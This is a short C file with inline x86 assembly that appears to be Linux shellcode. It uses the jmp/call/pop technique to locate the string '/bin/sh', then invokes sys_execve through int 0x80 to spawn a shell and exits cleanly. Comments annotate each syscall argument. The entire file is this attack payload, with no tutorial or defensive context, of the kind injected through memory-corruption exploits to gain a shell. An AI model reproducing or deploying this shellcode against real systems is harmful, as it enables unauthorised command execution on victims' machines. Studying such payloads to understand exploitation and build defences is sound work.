void
main()
{
	__asm__(
		"jmp	_L1\n"

		"_L0:\n"
		"\tpopl	%esi\n"

		"\txorl %eax,%eax\n"		/* create a zero value */
		"\tpush %eax\n"			/* store argv pointer on the stack */

		"\tmovb $0xb,%al\n"		/* syscall: sys_execve */
		"\tmov  %esi,%ebx\n"		/* p1: "/bin/sh" */
		"\tmov  %esp,%ecx\n"		/* p2: &argv */
		"\txorl %edx,%edx\n"		/* p3: NULL */
		"\tint  $0x80\n"		/* and GO! */

		"\txorl %eax,%eax\n"		/* syscall: sys_exit = 1 */
		"\tinc  %eax\n"
		"\txorl %ebx,%ebx\n"		/* p1: 0 */
		"\tint  $0x80\n"		/* and DONE! */

		"_L1:\n"
		"\tcall	_L0\n"

		".string \"/bin/sh\"\n"
	);
}
